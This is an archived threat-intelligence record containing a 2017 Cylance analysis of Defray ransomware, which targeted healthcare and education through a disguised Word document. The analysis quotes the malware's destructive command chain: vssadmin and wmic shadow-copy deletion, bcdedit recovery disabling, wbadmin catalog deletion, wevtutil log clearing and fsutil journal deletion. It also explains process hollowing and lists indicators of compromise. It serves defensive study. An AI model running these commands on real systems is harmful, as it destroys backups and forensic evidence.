{
    "id": "72ab8c4e-beb2-435d-9d32-e616984a67e3",
    "created_at": "2023-01-12T15:09:03.319753Z",
    "updated_at": "2025-03-27T02:16:26.175885Z",
    "deleted_at": null,
    "sha1_hash": "e344799bcdbf3a6b9b8569d16e4339d0b9ee98af",
    "title": "2017-09-26 - Defray Ransomware Hits Healthcare and Education",
    "authors": "",
    "file_creation_date": "2022-05-28T21:55:12Z",
    "file_modification_date": "2022-05-28T21:55:12Z",
    "file_size": 507471,
    "plain_text": "# Threat Spotlight: Defray Ransomware Hits Healthcare and Education\n\n**[threatvector.cylance.com/en_us/home/threat-spotlight-defray-ransomware-hits-healthcare-and-education.html](https://threatvector.cylance.com/en_us/home/threat-spotlight-defray-ransomware-hits-healthcare-and-education.html)**\n\nThe BlackBerry Cylance Threat Research Team\n\nDefray is a sophisticated, high-price ransomware attack aimed at very specific victims in the\nHealthcare and Education sectors.\n\n## Impact\n\nOne could be forgiven for having not heard of Defray in recent news. With the worlds'\nattention on [WannaCry,](https://threatvector.cylance.com/en_us/home/https://threatvector.cylance.com/en_us/home/threat-spotlight-wannacry-ransomware.html) [Petya/Not-Petya/Petya-Like, and the return of Locky and Globe](https://threatvector.cylance.com/en_us/home/https://threatvector.cylance.com/en_us/home/threat-spotlight-petya-like-ransomware-is-nasty-wiper.html)\nImposter, the focus has been squarely on widespread chaos campaigns. The focus of these\nlarge attacks is garnering headlines and making money.\n\nDefray differentiates itself by moving on specific targets in the healthcare industry, and doing\nso in such a way that data destruction may be its most important goal. Especially in\nhealthcare, there is a need to be ever vigilant, as things like patient records, monitoring\nmachines, and ultimately entire hospital operations could be affected.\n\nWe’re seeing more targeted attacks aimed at certain industries, and we expect this trend to\ncontinue in the years to come.\n\n## Tech Analysis\n\nThe community was made aware of the ransomware termed Defray when our colleagues\nover at Proofpoint [published an article on it.](https://www.proofpoint.com/us/threat-insight/post/defray-new-ransomware-targeting-education-and-healthcare-verticals)\n\nIn our analysis, we will discuss the Word document sample\n71089d862e3bb4c3a351252fcd6d9018866c265707508ed397f3efcdf3702723. This sample\ndrops an executable file with hash\n\n\n-----\n\n08cf8ed94cc1ef6ae23133f3e506a50d8aad9047c6fa74568a0373d991261aa4\n\nThis infection document is tailor-made to act as a kind of sophisticated phishing attack. In\nthis type of social engineering, the goal is to know ones' target well enough as to provide\nthem with reassurance so that they are never suspicious as to the source.\n\nDefrays' author has even gone so far as to do extensive research of the fake document\norigination organization. The name, job title, and organization details included in the\ndocument are all legitimate in an effort to make the victim feel like this is a document they\nshould be expecting to receive.\n\n_Figure 1: Infection Document_\n\nThe YouTube-style play button may seem out of place, but the other details included are\nthere to reassure the victim that it came from a legitimate source. The executable payload is\nnot a script or dropped by a script, but rather simply appended to the end of the OLE.\n\n**This attack vector is interesting as it does not cause Word to ask the user to enable**\n**macros, which many users are trained to be aware of.**\n\n_Figure 2: Actual Ransomware Executable_\n\nThe file is named ‘explorer.exe’ possibly in an attempt to show the user some name\nfamiliarity tie-in to Internet Explorer. The user may believe that by activating this, they will be\ntaken to a site or portal where the needed document is available or that it may simply\ndownload the document for them.\n\nThe process starts quietly. It immediately calls ShellExecute, a command to open or launch\nsomething else which can be passed parameters to run as another (more privileged) user. In\nthis case, it is cmd.exe that is chosen in order to set the system up to be even more\nvulnerable to attack. We will analyze the result of the shell command below.\n\n\n-----\n\n-----\n\n_Figure 3: Shell Command to Disable Protection_\n\n_[cmd.exe /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete](https://www.hybrid-analysis.com/sample/08cf8ed94cc1ef6ae23133f3e506a50d8aad9047c6fa74568a0373d991261aa4?environmentId=100#00016325-00003064)_\n\nFirst, it deletes all the ‘shadow copies,’ or restore points, as they are commonly known. Upon\nthe realization that something has gone wrong, the average user will try to affect repairs to\ntheir system via the last known good restore point. By anticipating this reaction, and\nremoving that option, the malware author has ensured that most victims will start to feel out\nof their depths.\n\n\n-----\n\n-----\n\n_Figure 4: System Restore Before Infection_\n\n\n-----\n\n-----\n\n_Figure 5: System Restore After Infection_\n\n_& bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default}_\n_recoveryenabled no_\n\nThese commands set the system up to ignore failures on future boots and disable any\nautomatic repair effort. This continues the process of taking away restoration options and\nensures that the victim makes it back to the desktop to see that the system is still ransomed.\n\n_& wbadmin delete catalog -quiet_\n\nDelete backup catalog on local system as a final surety that the victim cannot simply recover\nto an earlier point. At this point, any online backups have become unavailable to the user as\nan option.\n\n_& wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application_\n\nThese event logs related to Setup, System, Security, and Application are cleared in order to\nmake an Incident Response (IR) effort more difficult.\n\n_& fsutil usn deletejournal /D C:_\n\nDisables Update Sequence Number journal, the journal that provides a log of all changes\nmade to files on the volume. File creation, deletion, modification, etc. are all wiped here,\nagain making IR more difficult.\n\n_& powercfg.exe -x -standby-timeout-ac 0 & powercfg.exe -x -standby-timeout-dc 0 &_\n_powercfg.exe -x -hibernate-timeout-ac 0 & powercfg.exe -x -hibernate-timeout-dc 0_\n\nEnsures computer will not standby or hibernate at all, regardless of plug or battery power,\nallowing the malware time to complete its task uninterrupted.\n\nNext, the malware enumerates open processes and starts a copy of those processes in\nsuspended mode. After opening the process suspended, it writes a completely new PE\n(including MZ header) to the memory space. This is done using ZwUnmapViewOfSection, a\nfunction that releases all memory pointed to by a section. This allows for a\nWriteProcessMemory call to add the malicious code in to the process. This procedure is\nknown as [process hollowing and is effective for ‘borrowing’ a legitimate process name in](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)\norder to do nefarious activities.\n\n\n-----\n\n-----\n\n_Figure 6: Process Hollowing_\n\n\n-----\n\n-----\n\n_Figure 7: Spawned Processes_\n\nThese processes are the ones used to do the heavy lifting. They perform the actual\nencryption, communication with a C&C, and the writing of the ransom notes.\n\nThe code injected in to these processes is packed in the original executable, and as such we\ndumped the memory only once these injected processes had been initiated. Upon dumping\nof the hollowed process, we can find the kinaesthetic-electr[dot]000webhostapp[dot]com\nlisting hardcoded preceding a call to form a HTTP request.\n\n\n-----\n\n-----\n\n_Figure 8: Hardcoded URL_\n\nWe noticed the same sequence Proofpoint did, appended to the end of the file \"3082 04A4\n0201 0002 8201 0100 9FCF 5284\". This string acts as a flag to the encryption, letting it know\nthat a given file has already been processed. This is the only flag required in order to skip\nencryption; even a file appended with just these bytes will not be touched by the encrypting\nroutine at all.\n\n\n-----\n\n-----\n\n_Figure 9: End of File Encrypted Flag_\n\nWe should also note that unlike many other ransomware variants out today, the files are\nsimply encrypted as is; there is no change of type or extension.\n\nThe ransom notes are written via the sub-processes as both ‘FILES.TXT’ and ‘HELP.TXT’\nand are coded to drop a file in every folder.\n\nThe ransom note is written in an almost friendly tone, asking the victim to contact IT and\nsuggesting that questions and negotiation for a lower price may be possible. Provided are\ntwo encrypted email sources: a mail.ru address, and a BitMessage identity for \"fastest\nresponse.\"\n\nThe message to IT spells out the specific algorithms used and claims the development is\nadvanced enough to deter local decryption attempts. It ends with a suggestion to use offline\nbackups in the future.\n\n\n-----\n\n-----\n\n_Figure 10: The Ransom Note_\n\nOf particular note is that this piece of ransomware has no dependence on a network\nconnection or the C&C to perform its basic duties. The entire process can be executed\nwithout a NIC, and even with a connection, our sample did not execute the code reaching out\nto \"kinaesthetic.\" The ransom note does not provide a bitcoin wallet address up front,\nrequiring the victim to reach out in some way. As of this writing, there had been no response\nto email or BitMessage, seemingly suggesting that they are abandoned because the\ncampaign is over.\n\n## Conclusion\n\nDefray is a highly targeted, highly sophisticated attack against specific targeted organizations\nin the Healthcare and Education industries. The malware author thoroughly researched\nhis/her intended victims and carefully crafted the attack to look legitimate.\n\nThreat behavior found shows much activity with the purpose of putting recovery out of the\ngrasp of the average user. The ransom note is written in a friendly tone, with an almost\neducational piece of advice to perform offline backups in the future. We do not expect to see\nthis variant become widespread, and instead believe that the attack on its target has been\ncompleted.\n\n**This campaign should serve as a reminder to be vigilant as to the methods an**\n**organization uses to exchange documents, and never to trust anything that violates**\n**those methods.**\n\nIf you use our endpoint protection product, CylancePROTECT®, you are protected from this\nattack.\n\n## Indicators of Compromise (IoCs)\n\n08cf8ed94cc1ef6ae23133f3e506a50d8aad9047c6fa74568a0373d991261aa4 – Binary file\n2861159ee2de902bca0bde831f7194fccf3b5b6342fed486df4f3c912c4398da – Binary file\n71089d862e3bb4c3a351252fcd6d9018866c265707508ed397f3efcdf3702723 – OLE\ndocument - patient_report.doc\nkinaesthetic-electr[dot]000webhostapp[dot]com – C2 Domain\n\n## References\n\nhttps://www.cylance.com/en_us/blog/https://threatvector.cylance.com/en_us/home/https://thr\n[eatvector.cylance.com/en_us/home/threat-spotlight-petya-like-ransomware-is-nasty-](https://threatvector.cylance.com/en_us/home/https://threatvector.cylance.com/en_us/home/threat-spotlight-petya-like-ransomware-is-nasty-wiper.html)\nwiper.html\n\nhttps://www.cylance.com/en_us/blog/https://threatvector.cylance.com/en_us/home/https://thr\n\n\n-----\n\n[eatvector.cylance.com/en_us/home/threat-spotlight-wannacry-ransomware.html](https://threatvector.cylance.com/en_us/home/https://threatvector.cylance.com/en_us/home/threat-spotlight-wannacry-ransomware.html)\nhttps://www.proofpoint.com/us/threat-insight/post/defray-new-ransomware-targetingeducation-and-healthcare-verticals\n\nThe BlackBerry Cylance Threat Research Team\n\n## About The BlackBerry Cylance Threat Research Team\n\nThe BlackBerry Cylance Threat Research team examines malware and suspected malware\nto better identify its abilities, function and attack vectors. Threat Research is on the frontline\nof information security and often deeply examines malicious software, which puts us in a\nunique position to discuss never-seen-before threats.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-09-26 - Defray Ransomware Hits Healthcare and Education.pdf"
    ],
    "report_names": [
        "2017-09-26 - Defray Ransomware Hits Healthcare and Education.pdf"
    ],
    "threat_actors": [
        {
            "id": "475ea823-9e47-4098-b235-0900bc1a5362",
            "created_at": "2022-10-25T16:07:24.506596Z",
            "updated_at": "2025-03-27T02:02:10.263346Z",
            "deleted_at": null,
            "main_name": "Lunar Spider",
            "aliases": [
                "Gold SwathMore"
            ],
            "source_name": "ETDA:Lunar Spider",
            "tools": [
                "BokBot",
                "IceID",
                "IcedID",
                "NeverQuest",
                "Vawtrak",
                "grabnew"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c2385aea-d30b-4dbc-844d-fef465cf3ea9",
            "created_at": "2023-01-06T13:46:38.916521Z",
            "updated_at": "2025-03-27T02:00:02.950071Z",
            "deleted_at": null,
            "main_name": "LUNAR SPIDER",
            "aliases": [
                "GOLD SWATHMORE"
            ],
            "source_name": "MISPGALAXY:LUNAR SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "63061658-5810-4f01-9620-7eada7e9ae2e",
            "created_at": "2022-10-25T15:50:23.752974Z",
            "updated_at": "2025-03-27T02:00:55.538582Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "Wizard Spider",
                "UNC1878",
                "TEMP.MixMaster",
                "Grim Spider",
                "FIN12",
                "GOLD BLACKBURN",
                "ITG23",
                "Periwinkle Tempest",
                "DEV-0193"
            ],
            "source_name": "MITRE:Wizard Spider",
            "tools": [
                "TrickBot",
                "AdFind",
                "BITSAdmin",
                "Bazar",
                "LaZagne",
                "Nltest",
                "GrimAgent",
                "Dyre",
                "Ryuk",
                "Conti",
                "Emotet",
                "Rubeus",
                "Mimikatz",
                "Diavol",
                "PsExec",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f6f91e1c-9202-4497-bf22-9cd5ef477600",
            "created_at": "2023-01-06T13:46:38.86765Z",
            "updated_at": "2025-03-27T02:00:02.938998Z",
            "deleted_at": null,
            "main_name": "WIZARD SPIDER",
            "aliases": [
                "FIN12",
                "UNC2053",
                "Pistachio Tempest",
                "TEMP.MixMaster",
                "GOLD BLACKBURN",
                "Periwinkle Tempest",
                "DEV-0193",
                "Storm-0193",
                "Trickbot LLC",
                "DEV-0237"
            ],
            "source_name": "MISPGALAXY:WIZARD SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e6a21528-2999-4e2e-aaf4-8b6af14e17f3",
            "created_at": "2022-10-25T16:07:24.422115Z",
            "updated_at": "2025-03-27T02:02:10.216817Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "DEV-0193",
                "Gold Blackburn",
                "Gold Ulrick",
                "Grim Spider",
                "ITG23",
                "Operation BazaFlix",
                "Periwinkle Tempest",
                "TEMP.MixMaster",
                "Wizard Spider"
            ],
            "source_name": "ETDA:Wizard Spider",
            "tools": [
                "AdFind",
                "Agentemis",
                "Anchor_DNS",
                "BEERBOT",
                "BazarBackdoor",
                "BazarCall",
                "BazarLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "Conti",
                "Diavol",
                "Dyranges",
                "Dyre",
                "Dyreza",
                "Dyzap",
                "Gophe",
                "Invoke-SMBAutoBrute",
                "KEGTAP",
                "LaZagne",
                "LightBot",
                "PowerSploit",
                "PowerTrick",
                "PsExec",
                "Ryuk",
                "SessionGopher",
                "TSPY_TRICKLOAD",
                "Team9Backdoor",
                "The Trick",
                "TheTrick",
                "Totbrick",
                "TrickBot",
                "TrickLoader",
                "TrickMo",
                "Upatre",
                "bazaloader",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536143,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653774912,
    "ts_modification_date": 1653774912,
    "files": {
        "pdf": "https://archive.orkl.eu/e344799bcdbf3a6b9b8569d16e4339d0b9ee98af.pdf",
        "text": "https://archive.orkl.eu/e344799bcdbf3a6b9b8569d16e4339d0b9ee98af.txt",
        "img": "https://archive.orkl.eu/e344799bcdbf3a6b9b8569d16e4339d0b9ee98af.jpg"
    }
}